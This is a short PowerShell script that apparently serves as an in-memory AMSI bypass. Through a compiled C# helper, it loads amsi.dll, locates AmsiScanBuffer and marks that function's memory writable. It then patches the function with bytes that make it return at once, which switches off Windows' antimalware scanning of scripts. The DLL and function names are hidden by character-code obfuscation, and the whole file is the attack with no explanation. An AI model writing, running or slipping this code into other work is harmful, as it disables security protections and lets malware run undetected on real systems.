$MNCH1 = @"
using System;
using System.Runtime.InteropServices;
public class MNCH1 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr UCm7346RNKgzi7k_QY, string CqKdNmmhiGOVhoO);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr CLcDp4w2, UIntPtr wJOX6O52VhNWlIT, uint eRKBEykAeAyBY, out uint eRzFqzQNI5t6rdzvUGnw);
}
"@

Add-Type $MNCH1

$dO0vyBov1fPB3Xy_jlhY = [MNCH1]::LoadLibrary("$(('àmsì.d'+'ll').NoRMAlIzE([Char]([BYtE]0x46)+[cHAr](27+84)+[cHaR](114*26/26)+[ChAR]([bYTe]0x6d)+[cHar](2+66)) -replace [CHaR](92*23/23)+[char]([bYTe]0x70)+[chAr](123+15-15)+[CHAr]([bYtE]0x4d)+[char](47+63)+[ChAR]([byTE]0x7d))")
$rP4ffwQgqi5b9p7jndb = [MNCH1]::GetProcAddress($dO0vyBov1fPB3Xy_jlhY, "$([CHaR]([BYte]0x41)+[ChAr](109+61-61)+[chaR]([BYtE]0x73)+[cHar](105)+[chaR](83)+[CHar](99+28-28)+[CHaR]([byte]0x61)+[ChaR](110*35/35)+[cHar]([byTe]0x42)+[cHAR]([bYTe]0x75)+[cHaR](2+100)+[CHar](102+85-85)+[cHar](101*89/89)+[chAr]([BYte]0x72))")
$p = 0
[MNCH1]::VirtualProtect($rP4ffwQgqi5b9p7jndb, [uint32]5, 0x40, [ref]$p)
$Kn4RAvKKcV95U6rCj = "0xB8"
$DQvqpBD9wuI6T = "0x57"
$MvIfyEtlpzF6QlJ = "0x00"
$VKN8q18V4jgw38AZ = "0x07"
$bkWQNjXH7A = "0x80"
$deYGjJhFz4 = "0xC3"
$WIVUFTLwkz3QfAELS = [Byte[]] ($Kn4RAvKKcV95U6rCj,$DQvqpBD9wuI6T,$MvIfyEtlpzF6QlJ,$VKN8q18V4jgw38AZ,+$bkWQNjXH7A,+$deYGjJhFz4)
[System.Runtime.InteropServices.Marshal]::Copy($WIVUFTLwkz3QfAELS, 0, $rP4ffwQgqi5b9p7jndb, 6)